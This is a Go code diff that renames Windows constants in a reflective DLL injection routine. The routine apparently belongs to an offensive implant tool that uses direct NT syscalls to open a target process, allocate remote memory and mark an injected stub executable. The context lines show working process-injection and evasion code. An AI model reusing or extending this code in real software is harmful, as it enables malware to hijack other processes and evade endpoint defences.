@@ -105,7 +105,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 
 	mgr := getInjectManager()
 
-	hProc, err := syscallNtOpenProcess(mgr, PROCESS_ALL_ACCESS, uint32(pid))
+	hProc, err := syscallNtOpenProcess(mgr, processAllAccess, uint32(pid))
 	if err != nil {
 		return "", fmt.Errorf("NtOpenProcess(%d): %w", pid, err)
 	}
@@ -115,7 +115,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 		}
 	}()
 
-	imageBase, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(sizeOfImage), PAGE_READWRITE)
+	imageBase, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(sizeOfImage), pageReadwrite)
 	if err != nil {
 		return "", fmt.Errorf("allocate remote memory: %w", err)
 	}
@@ -178,7 +178,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 
 		if exportArgs != "" {
 			argBytes := append([]byte(exportArgs), 0)
-			argAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(argBytes)), PAGE_READWRITE)
+			argAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(argBytes)), pageReadwrite)
 			if err != nil {
 				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 				return "", fmt.Errorf("alloc args: %w", err)
@@ -467,7 +467,7 @@ func writeDllMainStubRemote(mgr *syscallManager, hProc uintptr, imageBase uintpt
 
 	stub = append(stub, 0xC3)
 
-	stubAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(stub)), PAGE_READWRITE)
+	stubAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(stub)), pageReadwrite)
 	if err != nil {
 		return 0, fmt.Errorf("alloc stub: %w", err)
 	}
@@ -478,7 +478,7 @@ func writeDllMainStubRemote(mgr *syscallManager, hProc uintptr, imageBase uintpt
 	}
 
 	var oldProt uint32
-	_, err = syscallNtProtectVirtualMemory(mgr, hProc, stubAddr, uintptr(len(stub)), PAGE_EXECUTE_READ)
+	_, err = syscallNtProtectVirtualMemory(mgr, hProc, stubAddr, uintptr(len(stub)), pageExecuteRead)
 	if err != nil {
 		return stubAddr, nil
 	}
